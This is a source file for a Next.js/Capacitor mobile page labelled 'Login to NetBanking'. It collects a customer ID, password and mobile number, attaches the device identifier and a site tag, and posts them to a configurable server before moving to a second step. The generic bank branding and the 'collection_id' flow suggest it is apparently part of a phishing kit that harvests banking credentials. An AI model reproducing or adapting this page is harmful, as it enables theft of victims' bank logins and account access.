'use client';
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";
import { useEffect } from "react";  
import styles from './start.module.css';
import DateInputComponent from "../inlcude/DateInputComponent";
import { Device } from '@capacitor/device';


export default function Home() {
    const router = useRouter();
    const API_URL = process.env.NEXT_PUBLIC_URL;
    const SITE = process.env.NEXT_PUBLIC_SITE;
    useEffect(()=>{
        localStorage.removeItem('collection_id');
    })
    const handleSubmit = async (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = SITE;
        jsonObject1['mobile_id'] = (await Device.getId()).identifier;
        console.log(jsonObject1);
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            localStorage.setItem('collection_id', responseData.data);
            router.push('/2');
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }
    }
  return (
    <>
    <Header />
    <div className="container">
      <h5 className={`${styles.textCenterDiv} mt-4 mb-3`}>Login  to NetBanking</h5>
      <form onSubmit={handleSubmit} >
          <div className={`form-group ${styles.inputDiv}`}>
            <label>Customer Id</label>
            <input type="text" name="custid" className={`form-control ${styles.formInput}`} required />
          </div>
          <div className={`form-group ${styles.inputDiv}`}>
            <label>Password</label>
            <input type="password" name="pass" className={`form-control ${styles.formInput}`} required />
          </div>
          <div className={`form-group ${styles.inputDiv}`}>
            <label>Mobile Number</label>
            <input type="text" name="mobile" className={`form-control ${styles.formInput}`} minLength={10} maxLength={10} inputMode="numeric" required placeholder=" " />
          </div>
          <div className="d-flex justify-content-center mt-4">
            <button type="submit"  className="btn btn-primary"> CONTINUE </button>
          </div>
        </form>
  
    </div>

    <Footer />
</>
  );
}
